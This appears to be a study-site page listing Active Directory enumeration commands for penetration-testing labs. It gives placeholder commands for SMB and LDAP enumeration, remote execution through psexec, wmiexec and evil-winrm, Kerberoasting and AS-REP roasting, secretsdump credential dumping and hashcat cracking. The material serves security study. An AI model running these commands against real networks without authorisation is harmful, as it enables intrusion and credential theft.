@@ -1,0 +1,256 @@
+---
+title: "Enumeration Command Reference"
+description: "Organized Active Directory study notes and reference."
+---
+
+{/* Generated from Active Directory/15 Enumeration Command Reference.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Use this page for lookup during a lab. Replace angle-bracket placeholders; commands are examples, not a script to run as a batch. [AD study path](/active-directory/index).
+
+**Prerequisites:** commands differ in required permissions. A successful login does not imply administrative access. Hashcat mode 13100 applies to the RC4 Kerberos TGS format; identify the actual hash format first. For BloodHound CE use a CE-compatible collector; the original list includes the legacy `bloodhound-python` name.
+
+## Authentication / Connectivity
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Check whether credentials work against the DC over SMB
+
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Authenticate to LDAP and verify credentials
+
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+    # Check whether the account can access WinRM
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+    # Enumerate SMB shares accessible to the account
+```
+
+## Users
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate domain users
+
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate users through LDAP
+
+GetADUsers.py -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+    # Query AD for domain users
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show information and group memberships for a user
+```
+
+## Groups
+
+```bash
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --groups
+    # Enumerate domain groups
+
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # List domain groups
+
+net rpc group members '<GROUP>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show members of a domain group
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show the groups a domain user belongs to
+```
+
+## Smb
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+    # List SMB shares and permissions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --sessions
+    # Show active SMB sessions
+
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --loggedon-users
+    # Show users currently logged onto the target
+
+smbclient -L //<DC_IP>/ -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # List available SMB shares
+
+smbclient //<DC_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>'
+    # Connect to a specific SMB share
+```
+
+## Windows Local Groups
+
+```powershell
+net localgroup
+    # List local groups on a Windows machine
+
+net localgroup Administrators
+    # Show members of the local Administrators group
+
+net localgroup "Remote Management Users"
+    # Show users allowed to use WinRM
+
+net localgroup "Backup Operators"
+    # Show members of Backup Operators
+
+net localgroup "Server Operators"
+    # Show members of Server Operators
+
+whoami /groups
+    # Show groups belonging to the current Windows account
+
+whoami /priv
+    # Show privileges assigned to the current Windows account
+```
+
+## Remote Access
+
+```bash
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+    # Connect to Windows through WinRM
+psexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Attempt remote command execution through SMB
+
+wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Execute commands remotely through WMI
+```
+
+## Ldap
+
+```bash
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=domain,DC=local' '(sAMAccountName=<USER>)'
+    # Query LDAP for a specific user's AD object
+
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=domain,DC=local' '(objectClass=user)'
+    # Enumerate AD user objects
+
+ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=domain,DC=local' '(sAMAccountName=<USER>)' memberOf
+    # Show the AD groups a specific user belongs to
+```
+
+## Kerberos / Spns
+
+```bash
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Find user accounts with registered SPNs
+
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
+    # Request TGS tickets for Kerberoasting
+
+GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
+    # Find accounts vulnerable to AS-REP roasting
+
+GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Query for AS-REP roastable accounts using credentials
+```
+
+## Credential / Hash Operations
+
+```bash
+secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Dump credential material if sufficiently privileged
+
+secretsdump.py -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Extract NTDS domain credentials if sufficiently privileged
+
+hashcat -m 13100 hashes.txt wordlist.txt
+    # Crack Kerberos TGS-REP hashes
+```
+
+## Powerview
+
+```powershell
+Get-DomainUser
+    # Enumerate domain users
+
+Get-DomainUser <USER>
+    # Get information about a specific domain user
+
+Get-DomainGroup
+    # Enumerate domain groups
+
+Get-DomainGroupMember "<GROUP>"
+    # Show members of a domain group
+
+Get-DomainUser <USER> -Properties memberof
+    # Show a user's AD group memberships
+
+Get-DomainComputer
+    # Enumerate domain computers
+
+Get-DomainController
+    # Find Domain Controllers
+
+Get-DomainSPNTicket
+    # Identify/request Kerberos tickets associated with SPNs
+```
+
+## Bloodhound
+
+```text
+bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc <DC_FQDN> -ns <DC_IP> -c All
+    # Collect AD relationship data for BloodHound
+
+Useful BloodHound relationships to look for:
+
+MemberOf
+    # Group membership
+
+AdminTo
+    # User/group has administrative access to a computer
+
+GenericAll
+    # Full control over an object
+
+GenericWrite
+    # Write permissions over an object
+
+WriteDACL
+    # Can modify an object's permissions
+
+WriteOwner
+    # Can change object ownership
+
+ForceChangePassword
+    # Can change another user's password
+
+AddMember
+    # Can add a principal to a group
+
+CanRDP
+    # Can use Remote Desktop
+
+CanPSRemote
+    # Can use PowerShell Remoting / WinRM
+
+AllowedToDelegate
+    # Delegation relationship
+```
+
+## Quick Htb Workflow
+
+```bash
+# 1. Verify credentials
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 2. Enumerate shares
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+
+# 3. Check user information / groups
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 4. Enumerate domain groups
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 5. Check LDAP
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 6. Look for Kerberoastable accounts
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+
+# 7. Check WinRM access
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 8. If WinRM works, connect
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+```
+
+Source: [original command list](/downloads/ad-enumeration-353cb6eb.txt).
